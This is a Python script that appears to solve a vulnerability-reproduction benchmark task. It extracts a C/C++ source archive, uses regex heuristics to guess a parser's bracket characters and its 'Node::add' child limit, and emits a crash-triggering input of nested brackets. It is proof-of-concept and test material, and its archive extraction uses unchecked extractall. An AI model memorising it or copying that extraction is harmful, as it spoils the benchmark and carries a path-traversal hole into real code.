import os
import tarfile
import zipfile
import tempfile
import re


def _extract_archive(src_path, dest_dir):
    if tarfile.is_tarfile(src_path):
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(dest_dir)
    elif zipfile.is_zipfile(src_path):
        with zipfile.ZipFile(src_path, "r") as zf:
            zf.extractall(dest_dir)
    else:
        # If it's a directory already, just return it
        if os.path.isdir(src_path):
            return src_path
        # Otherwise, copy as is
        raise ValueError("Unsupported archive format")
    return dest_dir


def _iter_source_files(root):
    exts = {".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".ipp", ".inc"}
    for dirpath, _, filenames in os.walk(root):
        for f in filenames:
            _, ext = os.path.splitext(f)
            if ext.lower() in exts:
                yield os.path.join(dirpath, f)


def _read_text(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()
    except Exception:
        try:
            with open(path, "r", encoding="latin-1", errors="ignore") as f:
                return f.read()
        except Exception:
            return ""


def _strip_comments_and_strings(code):
    # Remove // comments
    code = re.sub(r"//.*", "", code)
    # Remove /* */ comments
    code = re.sub(r"/\*.*?\*/", "", code, flags=re.S)
    # Remove string literals
    code = re.sub(r"\"(?:\\.|[^\"\\])*\"", '""', code)
    # Remove char literals
    code = re.sub(r"'(?:\\.|[^'\\])+'", "''", code)
    return code


def _find_function_bodies(code, qualname):
    # Find "Node::add(" followed by a body {...} with balanced braces
    bodies = []
    idx = 0
    while True:
        m = re.search(r"\b" + re.escape(qualname) + r"\s*\(", code[idx:])
        if not m:
            break
        start = idx + m.start()
        # find the opening '{' after the closing ')'
        paren_level = 0
        i = idx + m.end()  # after '(' in qualname(
        L = len(code)
        # balance parentheses to skip parameters
        found = False
        while i < L:
            ch = code[i]
            if ch == '(':
                paren_level += 1
            elif ch == ')':
                if paren_level == 0:
                    i += 1
                    # Skip spaces, attributes, qualifiers
                    while i < L and code[i] in " \t\r\n":
                        i += 1
                    if i < L and code[i] == '{':
                        found = True
                    break
                else:
                    paren_level -= 1
            i += 1
        if not found:
            idx = start + 1
            continue
        # Now i points at '{'
        brace_start = i
        brace_level = 0
        j = brace_start
        while j < L:
            if code[j] == '{':
                brace_level += 1
            elif code[j] == '}':
                brace_level -= 1
                if brace_level == 0:
                    body = code[brace_start:j + 1]
                    bodies.append(body)
                    idx = j + 1
                    break
            j += 1
        else:
            break
    return bodies


def _detect_bracket_pair(all_code):
    # Prefer bracket pairs that appear as char literals or in parser-like switch/case code
    pairs = [('(', ')'), ('[', ']'), ('{', '}'), ('<', '>')]
    counts = {}
    for op, cl in pairs:
        count = 0
        # Count char literal usage
        count += all_code.count("'" + op + "'")
        count += all_code.count("'" + cl + "'")
        # Count switch-case style presence
        count += len(re.findall(r"case\s*'" + re.escape(op) + r"'\s*:", all_code))
        count += len(re.findall(r"case\s*'" + re.escape(cl) + r"'\s*:", all_code))
        # Count comparisons with these chars
        count += len(re.findall(r"==\s*'" + re.escape(op) + r"'", all_code))
        count += len(re.findall(r"==\s*'" + re.escape(cl) + r"'", all_code))
        counts[(op, cl)] = count
    # Avoid choosing angle brackets by default (common in templates)
    # We'll penalize '<', '>' unless explicitly used in char literals
    ltgt_penalty = 0
    if counts.get(('<', '>'), 0) > 0:
        # reduce it to avoid selecting due to templates
        counts[('<', '>')] = counts[('<', '>')] // 4

    # Choose the highest count, but if all zero, default to parentheses
    best_pair = ('(', ')')
    best_score = -1
    for k, v in counts.items():
        if v > best_score:
            best_score = v
            best_pair = k
    return best_pair


def _detect_children_limit_from_bodies(bodies):
    # Try to detect numeric limits from conditions around throw
    # Heuristics:
    # - Look for patterns like size() >= NUMBER
    # - Or NUMBER <= size()
    # - Or constants defined like MAX_CHILDREN = NUMBER near the function body
    # - Or simple if (count >= NUMBER) throw;
    candidates = []

    for body in bodies:
        body_stripped = _strip_comments_and_strings(body)
        # Find if-conditions that directly throw
        # Pattern 1: if (...) throw
        for m in re.finditer(r"if\s*\((.*?)\)\s*throw", body_stripped, flags=re.S):
            cond = m.group(1)
            # Extract numbers
            for num in re.findall(r"\b(\d+)\b", cond):
                try:
                    n = int(num)
                    if 1 <= n <= 1000000:
                        candidates.append(n)
                except Exception:
                    pass
            # Extract size comparison like size() >= N
            m2 = re.search(r"size\s*\(\s*\)\s*([<>]=?)\s*(\d+)", cond)
            if m2:
                try:
                    n = int(m2.group(2))
                    if 1 <= n <= 1000000:
                        candidates.append(n)
                except Exception:
                    pass
            m3 = re.search(r"(\d+)\s*([<>]=?)\s*size\s*\(\s*\)", cond)
            if m3:
                try:
                    n = int(m3.group(1))
                    if 1 <= n <= 1000000:
                        candidates.append(n)
                except Exception:
                    pass

        # Pattern 2: if (...) { ... throw ... }
        for m in re.finditer(r"if\s*\((.*?)\)\s*\{(.*?)\}", body_stripped, flags=re.S):
            cond = m.group(1)
            block = m.group(2)
            if "throw" in block:
                for num in re.findall(r"\b(\d+)\b", cond):
                    try:
                        n = int(num)
                        if 1 <= n <= 1000000:
                            candidates.append(n)
                    except Exception:
                        pass
                m2 = re.search(r"size\s*\(\s*\)\s*([<>]=?)\s*(\d+)", cond)
                if m2:
                    try:
                        n = int(m2.group(2))
                        if 1 <= n <= 1000000:
                            candidates.append(n)
                    except Exception:
                        pass
                m3 = re.search(r"(\d+)\s*([<>]=?)\s*size\s*\(\s*\)", cond)
                if m3:
                    try:
                        n = int(m3.group(1))
                        if 1 <= n <= 1000000:
                            candidates.append(n)
                    except Exception:
                        pass

        # Also check for simple "if (count >= N) { ... throw ... }"
        for m in re.finditer(r"if\s*\(([^)]*?)\)\s*\{(.*?)\}", body_stripped, flags=re.S):
            cond = m.group(1)
            block = m.group(2)
            if "throw" in block:
                # Generic numeric extraction
                nums = re.findall(r"\b(\d+)\b", cond)
                for num in nums:
                    try:
                        n = int(num)
                        if 1 <= n <= 1000000:
                            candidates.append(n)
                    except Exception:
                        pass

        # Search for constants inside the body near throw
        # e.g., const int MAX_CHILDREN = 32;
        for m in re.finditer(r"\b(const|constexpr)?\s*(unsigned|size_t|int|long|auto)?\s*[A-Za-z_]\w*\s*=\s*(\d+)\s*;", body_stripped):
            try:
                n = int(m.group(3))
                if 1 <= n <= 1000000:
                    candidates.append(n)
            except Exception:
                pass

    # Heuristic selection:
    # Choose the smallest reasonable number > 1 (often limits like 16, 32)
    # If no candidates, return None
    if not candidates:
        return None
    # Filter to plausible small limits (<= 256)
    small = [n for n in candidates if n <= 256]
    if small:
        return min(small)
    # Else choose min of all
    return min(candidates)


def _detect_children_limit_from_all_code(all_code):
    code = _strip_comments_and_strings(all_code)
    # Look for typical patterns of constants
    patterns = [
        r"\bMAX_CHILDREN\b\s*=\s*(\d+)",
        r"\bMAX_KIDS\b\s*=\s*(\d+)",
        r"\bkMaxChildren\b\s*=\s*(\d+)",
        r"#\s*define\s+MAX_CHILDREN\s+(\d+)",
        r"const\s+(?:unsigned|size_t|int|long)\s+(?:MAX_CHILDREN|kMaxChildren|MaxChildren)\s*=\s*(\d+)\s*;",
        r"constexpr\s+(?:unsigned|size_t|int|long|auto)\s+(?:MAX_CHILDREN|kMaxChildren|MaxChildren)\s*=\s*(\d+)\s*;",
    ]
    candidates = []
    for pat in patterns:
        for m in re.finditer(pat, code):
            try:
                n = int(m.group(1))
                if 1 <= n <= 1000000:
                    candidates.append(n)
            except Exception:
                pass
    if not candidates:
        # Search for any "size() >= NUMBER" anywhere
        for m in re.finditer(r"size\s*\(\s*\)\s*([<>]=?)\s*(\d+)", code):
            try:
                n = int(m.group(2))
                if 1 <= n <= 1000000:
                    candidates.append(n)
            except Exception:
                pass
    if not candidates:
        return None
    small = [n for n in candidates if n <= 256]
    if small:
        return min(small)
    return min(candidates)


def _generate_bracket_children_input(pair, count):
    op, cl = pair
    child = op + cl
    root = op + (child * count) + cl
    return root


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as tmpdir:
            root = _extract_archive(src_path, tmpdir)

            all_code = ""
            files = list(_iter_source_files(root))
            for f in files:
                all_code += _read_text(f) + "\n"

            # Detect bracket pair used by parser; default to parentheses
            pair = _detect_bracket_pair(all_code)
            # If pair is curly or angle, prefer parentheses as safer default
            if pair in [('{', '}'), ('<', '>')]:
                pair = ('(', ')')

            # Detect children limit primarily from Node::add
            limit = None
            # Extract function bodies for Node::add
            bodies = []
            for f in files:
                code = _read_text(f)
                # Try to find bodies in stripped code to avoid confusion
                stripped = _strip_comments_and_strings(code)
                bodies.extend(_find_function_bodies(stripped, "Node::add"))

            limit1 = _detect_children_limit_from_bodies(bodies) if bodies else None
            limit2 = _detect_children_limit_from_all_code(all_code)

            # Choose best limit
            limit_candidates = [l for l in [limit1, limit2] if isinstance(l, int)]
            if limit_candidates:
                # Heuristic: choose the smallest plausible one
                limit = min(limit_candidates)

            # Desired child count: exceed the limit by 1 if known, else default to 29 (for 60-byte PoC with parentheses)
            if isinstance(limit, int) and limit > 0:
                child_count = limit + 1
                # Keep it within reasonable bounds to avoid huge input
                if child_count > 200:
                    child_count = 201
            else:
                # Aim for 60 bytes total if using 2-byte children plus 2-byte root
                # For 2+2N=60 => N=29
                child_count = 29
                # If for some reason pair isn't 2-byte child (it is), still keep near 60 length
                op, cl = pair
                if len(op + cl) == 2:
                    # Already 60 bytes
                    pass
                else:
                    # Fallback to a small number of children
                    child_count = 16

            # Generate input
            poc_str = _generate_bracket_children_input(pair, child_count)

            # Ensure it's bytes
            try:
                data = poc_str.encode("ascii")
            except Exception:
                data = poc_str.encode("utf-8", errors="ignore")
            return data